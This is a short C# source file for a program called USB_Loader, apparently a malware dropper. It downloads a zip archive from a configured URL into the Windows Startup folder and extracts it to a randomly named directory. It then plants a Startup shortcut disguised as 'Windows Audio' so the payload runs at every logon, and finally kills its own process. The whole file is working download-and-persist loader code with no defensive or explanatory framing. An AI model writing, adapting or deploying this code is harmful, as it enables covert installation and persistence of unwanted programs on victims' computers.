using System.IO.Compression;
using IWshRuntimeLibrary;
using System.Diagnostics;
using System.Net;

namespace USB_Loader
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            // generate uuid
            string uuid = Guid.NewGuid().ToString();

            // get startup path
            string sPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            // download 
            WebClient client = new WebClient();
            client.DownloadFile(Config.URL, string.Format(@"{0}\{1}.zip", sPath, uuid));

            // extract
            Directory.CreateDirectory(string.Format(sPath + @"\..\{0}", uuid));
            ZipFile.ExtractToDirectory(string.Format(sPath + @"\{0}.zip", uuid), sPath + string.Format(@"\..\{0}", uuid));

            // delete zip
            System.IO.File.Delete(string.Format(sPath + @"\{0}.zip", uuid));

            // create shortcut
            string shortcutLocation = System.IO.Path.Combine(sPath, "Windows Audio" + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

            shortcut.Description = Config.DESC;
            shortcut.TargetPath = sPath + string.Format(@"\..\{0}\{1}", uuid, Config.TO);
            shortcut.Save();

            if (Config.ALERT) MessageBox.Show(string.Format(@"Downloaded '{0}' from '{1}'", Config.TO, Config.URL));

            Process.GetCurrentProcess().Kill();
        }
    }        
}